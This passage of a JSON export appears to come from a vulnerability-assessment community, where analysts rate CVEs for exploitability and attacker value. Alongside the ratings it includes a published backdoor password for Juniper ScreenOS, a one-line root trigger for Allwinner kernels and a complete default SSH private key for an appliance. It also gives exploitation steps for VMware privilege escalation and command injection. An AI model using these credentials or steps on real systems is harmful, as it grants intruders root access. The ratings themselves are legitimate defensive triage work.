          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "f32d3b7f-446c-4b36-851a-273f582b5e54",
      "editorId": "1e48c935-9ca9-4fe9-a2c4-d4555448dd53",
      "topicId": "1b9b7e90-f527-46d3-b53e-8e41497b7213",
      "created": "2020-03-20T16:16:48.28453Z",
      "revisionDate": "2020-04-23T01:14:38.103693Z",
      "document": "Wrote up a full analysis of this bug in two parts at https://versprite.com/blog/security-research/cve-2019-1169-vulnerability-windows/. I believe that in reality CVE-2019-1169 actually covers several vulnerabilities, as if one looks at ZDI's advisory at https://www.zerodayinitiative.com/advisories/ZDI-19-709/ they can see that one of the bugs covered by CVE-2019-1169 is actually an information leak.\r\n\r\nMy blog post covers this information leak which is exploitable by attackers who have some knowledge of how Windows messages work and how windows hooks and event hooks operate. Exploiting the vulnerability is only possible on Windows 7 x86 and prior as it is a NULL pointer dereference vulnerability, however successful exploitation results in the ability to read a DWORD worth of information at two arbitrary addresses in kernel memory per exploitation attempt.\r\n\r\nI have also written up exploit code which will trigger this info leak vulnerability, which is available at https://github.com/VerSprite/research/tree/master/exploits/Ndays/CVE-2019-1169",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "difficult_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "e8c14117-587e-4c59-b757-22c7021da65b",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "8175e301-bbf6-48a2-9289-f7829c23132b",
      "created": "2020-03-21T13:24:41.696147Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "XXE vulnerability in library that's in use by over 500 projects on Github. ",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "485261b2-86af-4973-be38-e6bcbe463569",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "b07dd82e-171a-4dba-b7b8-8f55f7a7f76f",
      "created": "2020-03-21T13:52:59.314901Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "SSRF in npm package that's downloaded 23k/week and is found in 4k Github repos. High because of it's value to grab access keys from cloud metadata urls. \r\n\r\nhttps://hackerone.com/reports/786956",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "24da889d-04ea-49f8-b56d-d80ad0987724",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "59efdec4-921e-411a-8743-cb603c4bc068",
      "created": "2020-03-24T12:11:20.038137Z",
      "revisionDate": "2020-04-15T18:52:07.398883Z",
      "document": "A fairly standard policy of disabling preview windows is a good mitigation for this vulnerability.  Since this appears to have been found in the wild, but I'm lowering this from original assessment, due to it being patched in the latest April 2020 PT, and there wasn't a particular rush to fix it out of band.\r\n\r\nTencent has an analysis of the vulnerabilities based on the PT diffs: https://mp.weixin.qq.com/s/RvTZWvcXiXsI7xB6L9RWIg\r\n\r\nFrom the MSRC advisory, this has limited impact on Windows 10.\r\n\r\n> For systems running supported versions of Windows 10 a successful attack could only result in code execution within an AppContainer sandbox context with limited privileges and capabilities.",
      "score": 6,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "no_useful_data"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "b6e87753-d60e-4a6e-93ed-c16de55f404f",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "2d41d02a-a32c-4a7e-9c1b-6b01311003d5",
      "created": "2020-03-24T23:17:38.510731Z",
      "revisionDate": "2020-06-12T18:35:47.64811Z",
      "document": "This vulnerability is trivial to exploit.\r\nThe \"Open VMware USB Arbitrator Service\" binary can be run (through a hard link) from any location, including attacker controlled.  Next, when the Service binary is run, which any user can do, it automatically runs `../../../Contents/Library/services/VMware USB Arbitrator Service`.  By ensuring the hard link is 3 levels deep from `VMware USB Arbitrator Service`, we're able to get code execution.  When our payload (`VMware USB Arbitrator Service`) is run, it's done so with an EUID of 0, thus priv escalating.  This is trivial to exploit since we're not overwriting any files, or calling anything abnormal, and easy to clean-up.  There is NO chance of crashing the system either.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "204c2fa2-1b2c-48f8-bfad-59c0e026b6f4",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "15d712ce-a4ab-4866-8b72-833181af8747",
      "created": "2020-03-24T23:24:33.040479Z",
      "revisionDate": "2020-03-24T23:24:41.002752Z",
      "document": "This vulnerability is unbelievably easy to trigger.  The binary/process `sunxi_debug` was accidentally incorporated into kernel builds for Allwinner processors.  Simply echoing 'rootmydevice' to the process `/proc/sunxi_debug/sunxi_debug` would elevate the shell to root.  Beyond simple, trivial to code, absolutely safe from crashing the device.\r\nThere were a few issues though.  These devices tend to be cheap and/or obscure such as Dragon Android tablets and Orange Pi thus unlikely to be in non-BYOD enterprise environments.  The Android tables also incorporate sandboxing which prevented an app from sending the command to the process.",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        }
      ]
    },
    {
      "id": "ed541316-9978-4e2b-8b57-8b15f9957bc7",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "aa9ee4c4-fbaf-4275-b49d-0848f1e5bbd8",
      "created": "2020-03-24T23:33:47.978375Z",
      "revisionDate": "2020-03-24T23:33:47.981433Z",
      "document": "'unspecified password': `<<< %s(un='%s') = %u`.\r\nThis was a manufacturer backdoor account left on the device.  Interestingly, when experts analyzed the OS Images, they assessed that the password for the backdoor account was created in a way that would look like an innocuous string when analyzed.\r\nWhile Juniper isn't very common on enterprise environments, especially running ScreenOS, they still existed in smaller satellite offices.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3f8d2802-7c82-4a25-8a79-d8e27ebcd009",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "748ab553-1074-4fc0-9f1f-595ada4479a6",
      "created": "2020-03-24T23:46:47.973339Z",
      "revisionDate": "2020-04-08T04:54:54.575567Z",
      "document": "Default SSH key was left on the appliance, allowing anyone to login if they know the private key.  The private key was discovered/released, thus allowing easy login via SSH, which is on by default.\r\nKey is:\r\n```\r\n-----BEGIN RSA PRIVATE KEY-----\r\nMIICWAIBAAKBgGdlD7qeGU9f8mdfmLmFemWMnz1tKeeuxKznWFI+6gkaagqjAF10\r\nhIruzXQAik7TEBYZyvw9SvYU6MQFsMeqVHGhcXQ5yaz3G/eqX0RhRDn5T4zoHKZa\r\nE1MU86zqAUdSXwHDe3pz5JEoGl9EUHTLMGP13T3eBJ19MAWjP7Iuji9HAgElAoGA\r\nGSZrnBieX2pdjsQ55/AJA/HF3oJWTRysYWi0nmJUmm41eDV8oRxXl2qFAIqCgeBQ\r\nBWA4SzGA77/ll3cBfKzkG1Q3OiVG/YJPOYLp7127zh337hhHZyzTiSjMPFVcanrg\r\nAciYw3X0z2GP9ymWGOnIbOsucdhnbHPuSORASPOUOn0CQQC07Acq53rf3iQIkJ9Y\r\niYZd6xnZeZugaX51gQzKgN1QJ1y2sfTfLV6AwsPnieo7+vw2yk+Hl1i5uG9+XkTs\r\nRy45AkEAkk0MPL5YxqLKwH6wh2FHytr1jmENOkQu97k2TsuX0CzzDQApIY/eFkCj\r\nQAgkI282MRsaTosxkYeG7ErsA5BJfwJAMOXYbHXp26PSYy4BjYzz4ggwf/dafmGz\r\nebQs+HXa8xGOreroPFFzfL8Eg8Ro0fDOi1lF7Ut/w330nrGxw1GCHQJAYtodBnLG\r\nXLMvDHFG2AN1spPyBkGTUOH2OK2TZawoTmOPd3ymK28LriuskwxrceNb96qHZYCk\r\n86DC8q8p2OTzYwJANXzRM0SGTqSDMnnid7PGlivaQqfpPOx8MiFR/cGr2dT1HD7y\r\nx6f/85mMeTqamSxjTJqALHeKPYWyzeSnUrp+Eg==\r\n-----END RSA PRIVATE KEY-----\r\n```",
      "score": 3,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c937b037-fbdb-4615-bd21-46d031c3a1cc",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "636dcdd1-2ee4-469e-bd0f-080ce9642550",
      "created": "2020-03-25T00:04:00.943064Z",
      "revisionDate": "2020-03-25T00:04:00.945916Z",
      "document": "The  (3) part of this does seem to be true, using `vcl.load` and supplying it a file will attempt to load the file.  Because the  file is most likely NOT a `vcl` file, the  file will fail to load, however the error message echoed back to the user includes the first line of the file.\r\nWhile you are able to read an arbitrary file, you'll only get the first line, YMMV.  The process is most likely also not running as root, so `/etc/shadow` where the first line would be great most likely won't happen.",
      "score": 1,
      "metadata": {
        "tags": [
          "no_useful_data"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "48539ac6-cf7e-4b16-bdca-65989a96f539",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "4a1c9c8c-f7cb-4420-8266-dbc1133199bd",
      "created": "2020-03-25T00:10:37.464332Z",
      "revisionDate": "2020-03-25T00:10:50.079338Z",
      "document": "Authentication is required, although there are some defaults.\r\nOnce authenticated, this is a trivial RCE.   Simply `POST` an `oinkcode`, where the value is shellcode wrapped in ticks.  Typically the shellcode will want to be CMD and not a binary, with limited commands in the default appliance.  However, these should be easy to identify since the exploitation, post auth, is so trivial.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop",
          "post_auth"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "4593c751-72f6-4767-9f6c-bed033f906eb",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "d0f5aa2a-4d99-41a6-9f83-6d0ea1ad01fc",
      "created": "2020-03-25T00:20:29.507735Z",
      "revisionDate": "2020-03-25T00:20:29.510759Z",
      "document": "This vulnerability only happens when the `Limit` method is defined.  This most likely isn't very common in enterprise environments, and also the `Limit` method needs to be configured in an invalid way.\r\nPending all that is true, which is unlikely, its possible to send an `OPTIONS` HTTP request and get back arbitrary memory.\r\nUnlike Heartbleed, we're receiving back minimal memory and its also intermingled with the response.\r\nFrom my testing, against a test server, no useful data was found.  It's possible a production server on a very busy website may have divulged more useful data, but it would have to be minimal due to the returned buffer size.",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "obscure_configuration",
          "no_useful_data",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "b9c64198-cc82-4edd-ae38-00b85c3d2ef2",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "5ed4dbaa-c7bf-4e78-b8d0-0d65cd2bc083",
      "created": "2020-03-25T00:30:18.103445Z",
      "revisionDate": "2020-03-25T00:30:18.106309Z",
      "document": "Found this software in an enterprise environment.  The `/storage/tmp/devblocks_cache---ch_workers`and `/storage/tmp/zend_cache---ch_workers`files contain lots of data, however the only things of value are a list of usernames and password hashes.  When found in an enterprise, this gave us over 200 MD5 hashes, which was a huge win.  Never seen the software before or after though.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    }
  ]
}